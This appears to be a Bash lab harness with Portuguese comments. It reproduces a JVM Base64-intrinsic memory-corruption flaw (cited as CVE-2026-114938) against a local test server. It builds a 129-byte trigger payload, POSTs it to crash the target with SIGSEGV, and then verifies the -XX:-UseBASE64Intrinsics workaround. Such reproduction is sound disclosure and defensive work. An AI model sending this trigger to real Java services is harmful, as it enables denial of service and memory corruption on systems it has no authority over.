#!/usr/bin/env bash
# Teste nao interativo de ponta a ponta, sem AWS (Intel SDE).
# Uso: ./run-lab.sh
#
# Autor do harness: eduxcode (github.com/eduxcode)
# Primitiva: CVE-2026-114938 / Quang Luong - Calif.io
set -uo pipefail
LAB="$(cd "$(dirname "$0")" && pwd)"
cd "$LAB"
source "$LAB/demo/env.sh"

step() { printf '\n\033[1;36m== %s ==\033[0m\n' "$*"; }
ok()   { printf '  \033[32m[ok]\033[0m %s\n' "$*"; }
warn() { printf '  \033[33m[!]\033[0m %s\n' "$*"; }
bad()  { printf '  \033[31m[x]\033[0m %s\n' "$*"; }

if [ "$SDE_MODE" != 1 ]; then
  warn "SDE/JDK ausentes. Rodando ./demo/setup-sde.sh..."
  "$LAB/demo/setup-sde.sh" || { bad "setup falhou"; exit 1; }
  source "$LAB/demo/env.sh"
fi

EVID="$LAB/demo/evidence/lab-$(date +%H%M%S)"
mkdir -p "$EVID"
PORT=8080
BASE="http://127.0.0.1:${PORT}"
TARGET_PID=""
cleanup() { [ -n "$TARGET_PID" ] && kill "$TARGET_PID" 2>/dev/null; }
trap cleanup EXIT

step "0. Ambiente"
echo "  host: $(grep -m1 'model name' /proc/cpuinfo | cut -d: -f2- | xargs)"
echo "  SDE : $($SDE -version 2>&1 | head -1)"
echo "  JDK : $($J4S_JAVA -version 2>&1 | head -1)"
"$SDE" -icx -- "$J4S_JAVA" -XX:+PrintFlagsFinal -version 2>/dev/null \
  | awk '/UseAVX|UseBASE64Intrinsics/ {print "  flag:" $0}'

step "1. Causa raiz: underflow da mascara (Java puro)"
"$SDE" -icx -- "$J4S_JAVA" "${J4S_FLAGS[@]}" -cp "$J4S_BUILD" MaskUnderflow 2>&1 | sed -n '1,10p'

step "2. Oraculo: comprimento correto e janela OOB"
J4S_SDE=1 "$SDE" -icx -- "$J4S_JAVA" "${J4S_FLAGS[@]}" \
  -cp "$J4S_BUILD" Oracle --warmup 5000 2>&1 | tee "$EVID/oracle.txt"
ORACLE_RC=${PIPESTATUS[0]}

start_target() { # flags extras
  "$SDE" -icx -- "$J4S_JAVA" "${J4S_FLAGS[@]}" "$@" \
    -XX:ErrorFile="$EVID/hs_err_%p.log" \
    -Dwarmup=5000 -Dport="$PORT" -cp "$J4S_BUILD" DecodeServer \
    >> "$EVID/target.log" 2>&1 &
  TARGET_PID=$!
}

wait_health() {
  for _ in $(seq 1 90); do
    curl -sf -m 2 "$BASE/health" >/dev/null 2>&1 && return 0
    sleep 1
  done
  return 1
}

step "3. Alvo vulneravel"
start_target
wait_health || { bad "alvo nao subiu"; tail -20 "$EVID/target.log"; exit 1; }
ok "no ar: $(curl -s "$BASE/health")"

step "4. Baseline"
python3 -c 'import sys;sys.stdout.write("A"*64)' > "$EVID/valid.txt"
python3 -c 'import sys;sys.stdout.write("A"*128+"=")' > "$EVID/trigger.txt"
echo "  $BASE/decode-safe 64x'A' -> $(curl -s -m 10 -X POST --data-binary @"$EVID/valid.txt" "$BASE/decode-safe")"

step "5. Gatilho de 129 bytes em /decode-exact"
curl -s -m 30 -o "$EVID/response.json" -w '  http=%{http_code}\n' \
  -X POST --data-binary @"$EVID/trigger.txt" "$BASE/decode-exact"
cat "$EVID/response.json"; echo

for _ in $(seq 1 20); do
  kill -0 "$TARGET_PID" 2>/dev/null || break
  sleep 1
done

if kill -0 "$TARGET_PID" 2>/dev/null; then
  bad "alvo continuou de pe"
  ALIVE=1
else
  ok "alvo caiu (SIGSEGV), como esperado"
  ALIVE=0
  HS=$(ls "$EVID"/hs_err_*.log 2>/dev/null | head -1)
  [ -n "${HS:-}" ] && grep -E '^#  SIG|^# Problematic|^# V  \[' "$HS" | head -3
fi
wait "$TARGET_PID" 2>/dev/null
TARGET_PID=""

step "6. Workaround: -XX:-UseBASE64Intrinsics"
start_target -XX:-UseBASE64Intrinsics
wait_health || { bad "alvo com workaround nao subiu"; tail -20 "$EVID/target.log"; exit 1; }
echo "  health: $(curl -s "$BASE/health")"
curl -s -m 30 -o "$EVID/response-safe.json" -w '  gatilho -> http=%{http_code}\n' \
  -X POST --data-binary @"$EVID/trigger.txt" "$BASE/decode-exact"
cat "$EVID/response-safe.json"; echo
sleep 1
if curl -sf -m 3 "$BASE/health" >/dev/null 2>&1; then
  ok "alvo sobreviveu com o intrinsic desligado"
  WORKAROUND=0
else
  bad "alvo caiu mesmo com o workaround"
  WORKAROUND=1
fi

step "Resumo"
echo "  oraculo ......... rc=$ORACLE_RC (0 = corrupcao reproduzida)"
echo "  alvo ............ $([ "$ALIVE" = 0 ] && echo 'caiu com SIGSEGV' || echo 'continuou de pe')"
echo "  workaround ...... $([ "$WORKAROUND" = 0 ] && echo 'funcional' || echo 'falhou')"
echo "  evidencias ...... $EVID"

if [ "$ORACLE_RC" = 0 ] && [ "$ALIVE" = 0 ] && [ "$WORKAROUND" = 0 ]; then
  ok "reproducao completa: corrupcao + DoS + mitigacao"
  exit 0
fi
warn "reproducao incompleta"
exit 1
